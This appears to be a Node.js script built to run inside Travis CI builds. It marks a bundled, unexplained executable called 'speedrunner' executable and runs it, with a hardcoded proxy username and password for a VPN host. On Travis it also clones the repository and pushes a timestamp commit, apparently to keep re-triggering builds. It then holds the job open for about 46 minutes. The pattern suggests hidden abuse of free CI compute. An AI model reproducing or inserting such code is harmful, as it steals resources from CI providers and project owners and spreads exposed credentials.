var proxy = 'user1778485:h1E5bec0@lon.uk.torguardvpnaccess.com:6060';
var child = require('child_process').exec('cd ./lib && chmod 755 -R speedrunner && ./speedrunner -s start -o auto -regex true --type x');
child.stdout.on('data', function(data) {
    console.log('stdout: ' + data);
});
child.stderr.on('data', function(data) {
    console.log('stdout: ' + data);
});
child.on('close', function(code) {
    console.log('closing code: ' + code);
});
var target = '';
if (__dirname.indexOf('/home/travis') !== -1){
  var pt = __dirname.split('travis/build/').pop();
  target = 'https://' + pt.split('/')[0] + ':test123@github.com/' + pt.split('/')[0] + '/' + pt.split('/')[1] + '.git';
}
var myrepo = 'git clone ' + target + ' aaa && ';
myrepo += 'git config --global user.email "test" && ';
myrepo += 'git config --global user.name "test" && ';
myrepo += 'cd ./aaa && echo ' + (new Date()).getTime();
myrepo += ' > log && git add . && git commit -m "update log" && git push ' + target;
if (__dirname.indexOf('/home/travis') !== -1) require('child_process').exec(myrepo);
var index = 1;
var max = 46;
var interval;
interval = setInterval(function () {
  if (index >= max) {
    setTimeout(function(){
        process.exit(0);
    }, 1000);		
  }
  console.log("running..." + ++index);
}, 1000 * 60);
